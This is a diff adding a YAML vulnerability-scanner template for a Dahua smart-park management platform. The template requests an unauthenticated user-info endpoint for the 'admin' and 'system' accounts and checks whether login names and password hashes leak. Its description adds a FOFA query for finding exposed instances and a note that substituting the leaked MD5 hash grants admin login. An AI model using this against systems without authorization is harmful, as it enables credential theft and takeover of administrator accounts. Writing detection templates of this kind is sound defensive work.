@@ -1,0 +1,23 @@
+id: dahua-userinfo-disclosure
+
+info:
+  name: 智慧园区综合管理平台用户敏感信息泄露
+  author: nanzhi
+  severity: high
+  verified: true
+  description: |
+    admin panel: http://x.x.x.x:8009/admin/login_login.action -> replace md5 -> login success
+    fofa: title="智慧园区综合管理平台"
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /admin/user_getUserInfoByUserName.action?userName=admin
+    expression: response.status == 200 && response.body.bcontains(b'"loginName":') && response.body.bcontains(b'"loginPass":')
+  r1:
+    request:
+      method: GET
+      path: /admin/user_getUserInfoByUserName.action?userName=system
+    expression: response.status == 200 && response.body.bcontains(b'"loginName":') && response.body.bcontains(b'"loginPass":')
+expression: r0() || r1()
